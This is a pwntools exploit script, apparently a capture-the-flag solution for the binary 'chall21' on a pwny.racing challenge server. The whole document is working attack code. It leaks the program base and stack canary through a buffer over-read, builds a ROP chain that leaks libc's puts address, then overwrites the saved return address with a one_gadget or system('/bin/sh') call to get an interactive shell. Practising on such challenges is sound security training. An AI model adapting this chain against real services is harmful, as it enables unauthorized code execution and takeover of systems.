#!/usr/bin/env python
import os, sys, pwn, time
ARGS = [arg.lower() for arg in sys.argv]

log = lambda m : pwn.log.info(m)

BINARY_PATH = "./chall21"
BINARY = pwn.ELF(BINARY_PATH)

LIBC = None
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"

HOST = "challenge.pwny.racing"
PORT = 40021
ONLINE = "online" in ARGS
GDB_DEBUG = "gdb" in ARGS
GDB_BEGIN = "gdb-begin" in ARGS
GDB_SCRIPT = """
continue
"""

def connect():
    global c, LIBC_PATH, LIBC

    try:
        if c is not None: c.close()
    except:
        pass

    if not ONLINE:
        if GDB_BEGIN:
            log("Starting with GDB BEGIN")
            c = pwn.gdb.debug(BINARY_PATH, GDB_SCRIPT)
        else:
            log("Starting \"{}\"".format(BINARY_PATH))
            c = pwn.process(BINARY_PATH)
            if GDB_DEBUG:
                log("Attaching GDB")
                pwn.gdb.attach(c, GDB_SCRIPT)
    else:
        LIBC_PATH = "libc-2.27.so"
        c = pwn.connect(HOST, PORT)

    if LIBC is None: LIBC = pwn.ELF(LIBC_PATH)

connect()

def leak(payload, raw=False):
    if raw: c.send(payload)
    else: c.sendline(payload)
    c.recvuntil("output: ")
    leak = c.recvuntil("\nbuffer:").replace("\nbuffer:", '')[len(payload):]
    return leak.ljust(8, '\x00')


# Stage 1: Leak PIE base
BINARY.address = pwn.u64(leak("A"*8*3)) & 0xfffffffffffff000
pwn.log.info("Binary Base: {}".format(hex(BINARY.address)))

cookie = pwn.u64(( "\x00" + leak(("A"*8*9) + "A"))[:8])
pwn.log.info("Stack Cookie: {}".format(hex(cookie)))

# Calculate pop rdi gadget address
pop_rdi = BINARY.address + 0xc33

# Stage 2: Leak libc
c.sendline(''.join([
    ("A" * 8) * 9,                      # Padding to stack cookie
    pwn.p64(cookie),                    # Write leaked stack cookie
    "B" * 8,                            # Overwrite saved rbp
    pwn.p64(pop_rdi),                   # Overwrite saved rip with small ROP chain
    pwn.p64(BINARY.got['puts']),        # Pop resolved puts@libc into rdi
    pwn.p64(BINARY.symbols['puts']),    # Call puts() thunk to leak puts@libc
    pwn.p64(BINARY.address + 0x7d0)     # Goto entry
]))
c.sendline("") # break loop and return

# Parese leaked puts@libc
c.recvuntil("buffer: ")
puts_libc = pwn.u64(c.recv().split('pwny')[0].strip().ljust(8, '\x00'))
pwn.log.info("puts@libc: {}".format(hex(puts_libc)))

# Calculate libc base
LIBC.address = puts_libc - LIBC.symbols['puts']
pwn.log.info("libc base: {}".format(hex(LIBC.address)))

# Reset program
cookie = pwn.u64(( "\x00" + leak(("A"*8*9) + "A"))[:8])
pwn.log.info("Stack Cookie 2: {}".format(hex(cookie)))

# Pop a shell
payload = ("A" * 8) * 9
payload += pwn.p64(cookie)
payload += "B"*8
if ONLINE:
    payload += pwn.p64(LIBC.address + 0x4f322)
else:
    payload += pwn.p64(pop_rdi)
    payload += pwn.p64(next(LIBC.search("/bin/sh\x00")))
    payload += pwn.p64(LIBC.symbols["system"])

c.sendline(payload)
c.sendline("") # break loop and return

c.interactive()
